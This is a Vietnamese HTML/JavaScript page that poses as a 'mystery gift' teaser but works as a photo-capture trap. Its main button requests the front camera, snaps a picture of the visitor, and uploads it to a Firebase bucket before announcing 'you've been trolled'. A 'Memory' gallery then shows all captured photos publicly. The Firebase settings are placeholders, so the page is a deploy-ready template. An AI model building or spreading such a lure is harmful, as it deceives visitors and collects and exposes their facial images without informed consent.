<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mở Quà Bí Mật — Đừng Bỏ Lỡ!</title>
  <style>
    :root {
      --bg-1: #070b19;
      --bg-2: #161038;
      --accent-1: #ff2a85;
      --accent-2: #7b2cbf;
      --cyan: #22d3ee;
      --text: #f8fafc;
      --muted: #94a3b8;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
    }

    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
      color: var(--text);
      background:
        radial-gradient(circle at 20% 20%, rgba(255, 42, 133, 0.22), transparent 45%),
        radial-gradient(circle at 80% 80%, rgba(34, 211, 238, 0.18), transparent 45%),
        linear-gradient(145deg, var(--bg-1), var(--bg-2));
      overflow-x: hidden;
    }

    .card {
      position: relative;
      width: 100%;
      max-width: 460px;
      padding: 40px 26px 34px;
      border-radius: 26px;
      text-align: center;
      background: rgba(15, 23, 42, 0.72);
      border: 1px solid rgba(255, 255, 255, 0.12);
      backdrop-filter: blur(14px);
      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.55);
    }

    .badge {
      display: inline-block;
      padding: 6px 14px;
      border-radius: 999px;
      font-size: 0.78rem;
      font-weight: 700;
      letter-spacing: 0.06em;
      text-transform: uppercase;
      color: var(--cyan);
      background: rgba(34, 211, 238, 0.12);
      border: 1px solid rgba(34, 211, 238, 0.35);
      margin-bottom: 16px;
    }

    h1 {
      font-size: 1.85rem;
      line-height: 1.25;
      margin-bottom: 12px;
      background: linear-gradient(90deg, #fff, #fbcfe8, var(--cyan));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .desc {
      font-size: 0.98rem;
      line-height: 1.55;
      color: var(--muted);
      margin-bottom: 30px;
    }

    .btn-main {
      position: relative;
      width: 100%;
      max-width: 310px;
      padding: 18px 28px;
      border: none;
      border-radius: 999px;
      font-size: 1.15rem;
      font-weight: 800;
      letter-spacing: 0.03em;
      color: #fff;
      cursor: pointer;
      background: linear-gradient(135deg, var(--accent-1), var(--accent-2));
      box-shadow: 0 10px 30px rgba(255, 42, 133, 0.45);
      transition: transform 0.2s ease, box-shadow 0.2s ease;
      animation: pulseGlow 1.8s infinite ease-in-out;
    }

    .btn-main:hover {
      transform: translateY(-2px) scale(1.03);
      box-shadow: 0 14px 38px rgba(255, 42, 133, 0.7);
    }

    .btn-main:active {
      transform: scale(0.98);
    }

    .btn-main:disabled {
      opacity: 0.65;
      cursor: not-allowed;
      animation: none;
    }

    @keyframes pulseGlow {
      0%, 100% {
        box-shadow: 0 10px 28px rgba(255, 42, 133, 0.42);
      }
      50% {
        box-shadow: 0 12px 42px rgba(34, 211, 238, 0.45);
      }
    }

    .status {
      margin-top: 16px;
      min-height: 22px;
      font-size: 0.9rem;
      color: var(--cyan);
    }

    .divider {
      height: 1px;
      background: rgba(255, 255, 255, 0.09);
      margin: 26px 0 20px;
    }

    .btn-memory {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      padding: 11px 22px;
      border-radius: 14px;
      font-size: 0.95rem;
      font-weight: 700;
      color: var(--cyan);
      background: rgba(34, 211, 238, 0.08);
      border: 1px solid rgba(34, 211, 238, 0.35);
      cursor: pointer;
      transition: background 0.2s ease, color 0.2s ease, transform 0.2s ease;
    }

    .btn-memory:hover {
      background: var(--cyan);
      color: #070b19;
      transform: translateY(-1px);
    }

    video, canvas {
      display: none;
    }

    /* Modal Bộ Nhớ */
    .modal {
      display: none;
      position: fixed;
      inset: 0;
      z-index: 999;
      padding: 20px;
      background: rgba(2, 6, 23, 0.85);
      backdrop-filter: blur(10px);
      overflow-y: auto;
    }

    .modal.open {
      display: block;
    }

    .modal-box {
      position: relative;
      max-width: 860px;
      margin: 30px auto;
      padding: 24px;
      border-radius: 22px;
      background: #0f172a;
      border: 1px solid rgba(255, 255, 255, 0.12);
      box-shadow: 0 25px 70px rgba(0, 0, 0, 0.7);
    }

    .modal-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 18px;
      padding-bottom: 12px;
      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
    }

    .modal-header h2 {
      font-size: 1.3rem;
      color: var(--cyan);
    }

    .btn-close {
      width: 36px;
      height: 36px;
      border: none;
      border-radius: 10px;
      font-size: 1.3rem;
      line-height: 1;
      color: var(--text);
      background: rgba(255, 255, 255, 0.08);
      cursor: pointer;
    }

    .btn-close:hover {
      background: rgba(255, 42, 133, 0.35);
    }

    .gallery {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(175px, 1fr));
      gap: 14px;
    }

    .photo-item {
      border-radius: 14px;
      overflow: hidden;
      background: #1e293b;
      border: 1px solid rgba(255, 255, 255, 0.08);
    }

    .photo-item img {
      display: block;
      width: 100%;
      height: 195px;
      object-fit: cover;
    }

    .empty-msg {
      grid-column: 1 / -1;
      text-align: center;
      padding: 36px 12px;
      color: var(--muted);
    }
  </style>

  <!-- Firebase Compat SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-firestore-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-storage-compat.js"></script>
</head>
<body>
  <main class="card">
    <div class="badge">✨ Hot Trend Hôm Nay</div>
    <h1>Ấn Vào Đây Ngay!</h1>
    <p class="desc">
      Có một điều bất ngờ cực thú vị đang chờ bạn mở khóa. Nhấn nút bên dưới để xem ngay!
    </p>

    <button id="mainBtn" class="btn-main" type="button" onclick="handleAction()">
      👉 ẤN VÀO ĐÂY 👈
    </button>

    <div id="statusText" class="status"></div>

    <div class="divider"></div>

    <button class="btn-memory" type="button" onclick="openMemory()">
      🧠 Bộ Nhớ
    </button>
  </main>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas"></canvas>

  <div id="memoryModal" class="modal" role="dialog" aria-modal="true" aria-labelledby="memoryTitle">
    <div class="modal-box">
      <div class="modal-header">
        <h2 id="memoryTitle">🧠 Bộ Nhớ</h2>
        <button class="btn-close" type="button" onclick="closeMemory()" aria-label="Đóng">&times;</button>
      </div>
      <div id="gallery" class="gallery"></div>
    </div>
  </div>

  <script>
    // Thay cấu hình Firebase của bạn vào đây
    const firebaseConfig = {
      apiKey: "THAY_API_KEY",
      authDomain: "THAY_PROJECT_ID.firebaseapp.com",
      projectId: "THAY_PROJECT_ID",
      storageBucket: "THAY_PROJECT_ID.appspot.com",
      messagingSenderId: "THAY_SENDER_ID",
      appId: "THAY_APP_ID"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const storage = firebase.storage();

    const mainBtn = document.getElementById("mainBtn");
    const statusText = document.getElementById("statusText");
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const memoryModal = document.getElementById("memoryModal");
    const gallery = document.getElementById("gallery");

    async function handleAction() {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        statusText.textContent = "Trình duyệt không hỗ trợ camera hoặc chưa chạy qua HTTPS.";
        return;
      }

      mainBtn.disabled = true;
      statusText.textContent = "Đang xin quyền camera...";

      let stream = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: false
        });

        video.srcObject = stream;
        await new Promise((resolve) => {
          video.onloadedmetadata = () => resolve();
        });
        await video.play();

        statusText.textContent = "Đang chụp khoảnh khắc...";
        await new Promise((r) => setTimeout(r, 700));

        const width = video.videoWidth || 640;
        const height = video.videoHeight || 480;
        canvas.width = width;
        canvas.height = height;

        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, width, height);

        const dataUrl = canvas.toDataURL("image/jpeg", 0.82);

        statusText.textContent = "Đang lưu vào Bộ Nhớ...";
        await uploadPhoto(dataUrl);

        statusText.textContent = "Xong! Ảnh đã được thêm vào Bộ Nhớ.";
        alert("🎉 Bạn đã bị troll! Ảnh vừa chụp đã lưu vào Bộ Nhớ.");
      } catch (err) {
        console.error(err);
        statusText.textContent = "Bạn đã từ chối quyền camera hoặc có lỗi xảy ra.";
        alert("Cần cấp quyền camera để tiếp tục!");
      } finally {
        if (stream) {
          stream.getTracks().forEach((track) => track.stop());
        }
        mainBtn.disabled = false;
      }
    }

    async function uploadPhoto(dataUrl) {
      const fileName = `mem_${Date.now()}_${Math.random().toString(36).slice(2, 7)}.jpg`;
      const ref = storage.ref(`memories/${fileName}`);
      const snap = await ref.putString(dataUrl, "data_url");
      const url = await snap.ref.getDownloadURL();

      await db.collection("memories").add({
        url,
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
      });
    }

    async function openMemory() {
      memoryModal.classList.add("open");
      gallery.innerHTML = '<div class="empty-msg">Đang tải ảnh từ Bộ Nhớ...</div>';

      try {
        const snap = await db.collection("memories").orderBy("createdAt", "desc").get();
        gallery.innerHTML = "";

        if (snap.empty) {
          gallery.innerHTML = '<div class="empty-msg">Chưa có hình ảnh nào trong Bộ Nhớ.</div>';
          return;
        }

        snap.forEach((doc) => {
          const item = doc.data();
          if (!item.url) return;

          const card = document.createElement("div");
          card.className = "photo-item";

          const img = document.createElement("img");
          img.src = item.url;
          img.alt = "Ảnh trong Bộ Nhớ";
          img.loading = "lazy";

          card.appendChild(img);
          gallery.appendChild(card);
        });
      } catch (err) {
        console.error(err);
        gallery.innerHTML = '<div class="empty-msg">Không tải được dữ liệu (kiểm tra lại Firebase Config & Rules).</div>';
      }
    }

    function closeMemory() {
      memoryModal.classList.remove("open");
    }

    memoryModal.addEventListener("click", (e) => {
      if (e.target === memoryModal) {
        closeMemory();
      }
    });
  </script>
</body>
</html>
